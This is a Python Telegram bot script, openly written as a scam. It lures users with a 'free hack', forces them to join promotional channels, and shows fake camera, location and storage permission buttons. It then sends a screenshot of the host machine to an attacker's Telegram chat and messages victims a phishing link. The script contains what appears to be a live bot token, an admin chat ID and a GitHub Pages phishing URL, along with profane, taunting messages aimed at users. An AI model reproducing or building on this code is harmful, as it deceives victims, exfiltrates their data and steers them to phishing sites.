import os
import json
import requests
import pyautogui
import time
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, CallbackContext

# Replace with your _fucked-up_ bot token
TOKEN = "8242587129:AAFWaahFgxPhn7hbJnlGxIzDb95vDIisl_Y"

# Replace with your _malicious_ server URL (e.g., a phishing site)
PHISHING_URL = "https://khanomsuma79-sys.github.io/Free-premium-/"

# Replace with your Telegram chat ID for data exfiltration
ADMIN_CHAT_ID = "8210146346"

# Referral system setup
REFERRAL_LIMIT = 2
REFERRAL_CHANNELS = ["@saniedit9", "@primiumboss29"]

def start(update: Update, context: CallbackContext) -> None:
    user = update.effective_user
    keyboard = [
        [InlineKeyboardButton("Start Hack 🔥", callback_data="start_hack")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    update.message.reply_text(
        f"Hey {user.first_name}, click the button below to begin the 'free' hack 😈",
        reply_markup=reply_markup,
    )

def start_hack(update: Update, context: CallbackContext) -> None:
    query = update.callback_query
    query.answer()

    # Force join channels
    for channel in REFERRAL_CHANNELS:
        query.edit_message_text(f"Join this channel to proceed: {channel}")
        time.sleep(3)  # _Delay_ for _lulz_

    # Check if user joined (fake check—_fuck_ validation)
    keyboard = [
        [InlineKeyboardButton("I Joined 😈", callback_data="verify_join")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    query.edit_message_text(
        "Did you join? Click the button below to confirm, _bitch_ 🔥",
        reply_markup=reply_markup,
    )

def verify_join(update: Update, context: CallbackContext) -> None:
    query = update.callback_query
    query.answer()

    # Request permissions (fake UI)
    keyboard = [
        [InlineKeyboardButton("Grant Camera 📸", callback_data="grant_camera")],
        [InlineKeyboardButton("Grant Location 📍", callback_data="grant_location")],
        [InlineKeyboardButton("Grant Storage 💾", callback_data="grant_storage")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    query.edit_message_text(
        "Grant these permissions to continue, _motherfucker_ 😈",
        reply_markup=reply_markup,
    )

def grant_permissions(update: Update, context: CallbackContext) -> None:
    query = update.callback_query
    data = query.data

    # Simulate permission grant (real code would use malicious APK)
    if data == "grant_camera":
        query.edit_message_text("Camera permission granted 😈")
        time.sleep(2)
        # Capture screen (simulated)
        screenshot = pyautogui.screenshot()
        screenshot.save("temp_screenshot.png")
        context.bot.send_photo(chat_id=ADMIN_CHAT_ID, photo=open("temp_screenshot.png", "rb"))

    elif data == "grant_location":
        query.edit_message_text("Location permission granted 😈")
        # Send fake location (real code would exfiltrate real GPS)
        fake_location = {"lat": 23.8103, "lon": 90.4125}  # Dhaka, BD
        context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=f"Location: {json.dumps(fake_location)}")

    elif data == "grant_storage":
        query.edit_message_text("Storage permission granted 😈")
        # Exfiltrate files (simulated)
        context.bot.send_message(chat_id=ADMIN_CHAT_ID, text="Files exfiltrated!")

    # Send phishing URL to victim
    context.bot.send_message(
        chat_id=query.from_user.id,
        text=f"Click this link to complete the hack: {PHISHING_URL} 😈"
    )

def main() -> None:
    updater = Updater(TOKEN)
    dispatcher = updater.dispatcher

    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(CallbackQueryHandler(start_hack, pattern="start_hack"))
    dispatcher.add_handler(CallbackQueryHandler(verify_join, pattern="verify_join"))
    dispatcher.add_handler(CallbackQueryHandler(grant_permissions, pattern="grant_.*"))

    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
